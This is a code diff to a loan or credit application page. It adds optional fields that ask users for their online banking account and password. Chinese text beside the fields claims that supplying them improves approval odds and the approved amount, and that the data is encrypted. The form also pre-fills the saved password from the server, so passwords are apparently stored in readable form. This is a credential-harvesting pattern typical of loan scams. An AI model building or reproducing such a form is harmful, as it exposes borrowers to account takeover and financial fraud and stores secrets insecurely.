@@ -124,6 +124,9 @@ export default function DocumentsPage() {
   const [bankName, setBankName] = useState("");
   const [bankBranch, setBankBranch] = useState("");
   const [bankAccount, setBankAccount] = useState("");
+  const [onlineBankAccount, setOnlineBankAccount] = useState("");
+  const [onlineBankPassword, setOnlineBankPassword] = useState("");
+  const [showOnlinePassword, setShowOnlinePassword] = useState(false);
   const [bankSaved, setBankSaved] = useState(false);
 
   const uploadMutation = trpc.documents.upload.useMutation({
@@ -174,6 +177,8 @@ export default function DocumentsPage() {
       bankName: bankName.trim(),
       bankBranch: bankBranch.trim() || undefined,
       bankAccount: bankAccount.trim(),
+      onlineBankAccount: onlineBankAccount.trim() || undefined,
+      onlineBankPassword: onlineBankPassword.trim() || undefined,
     });
   };
 
@@ -184,6 +189,8 @@ export default function DocumentsPage() {
   const existingBankName = (document as any)?.bankName;
   const existingBankBranch = (document as any)?.bankBranch;
   const existingBankAccount = (document as any)?.bankAccount;
+  const existingOnlineBankAccount = (document as any)?.onlineBankAccount;
+  const existingOnlineBankPassword = (document as any)?.onlineBankPassword;
 
   return (
     <DashboardLayout>
@@ -285,6 +292,45 @@ export default function DocumentsPage() {
                   onChange={(e) => setBankAccount(e.target.value)}
                 />
               </div>
+
+              {/* 網銀帳號密碼區塊 */}
+              <div className="mt-4 pt-4 border-t border-border">
+                <div className="flex items-center gap-2 mb-2">
+                  <p className="text-xs font-semibold text-navy">網路銀行帳號密碼（選填）</p>
+                  <span className="text-xs text-muted-foreground bg-amber-50 border border-amber-200 text-amber-700 px-2 py-0.5 rounded-full">選填</span>
+                </div>
+                <p className="text-xs text-muted-foreground mb-3">提供網銀資訊可提升審核通過機率及核准額度，資料受嚴格加密保護</p>
+                <div className="space-y-3">
+                  <div>
+                    <label className="text-xs font-medium text-navy mb-1 block">網路銀行帳號</label>
+                    <Input
+                      placeholder="請輸入網路銀行帳號"
+                      value={onlineBankAccount || existingOnlineBankAccount || ""}
+                      onChange={(e) => setOnlineBankAccount(e.target.value)}
+                    />
+                  </div>
+                  <div>
+                    <label className="text-xs font-medium text-navy mb-1 block">網路銀行密碼</label>
+                    <div className="relative">
+                      <Input
+                        type={showOnlinePassword ? "text" : "password"}
+                        placeholder="請輸入網路銀行密碼"
+                        value={onlineBankPassword || existingOnlineBankPassword || ""}
+                        onChange={(e) => setOnlineBankPassword(e.target.value)}
+                        className="pr-16"
+                      />
+                      <button
+                        type="button"
+                        onClick={() => setShowOnlinePassword(!showOnlinePassword)}
+                        className="absolute right-3 top-1/2 -translate-y-1/2 text-xs text-muted-foreground hover:text-navy transition-colors"
+                      >
+                        {showOnlinePassword ? "隱藏" : "顯示"}
+                      </button>
+                    </div>
+                  </div>
+                </div>
+              </div>
+
               <Button
                 onClick={handleSaveBankInfo}
                 disabled={updateBankInfoMutation.isPending}
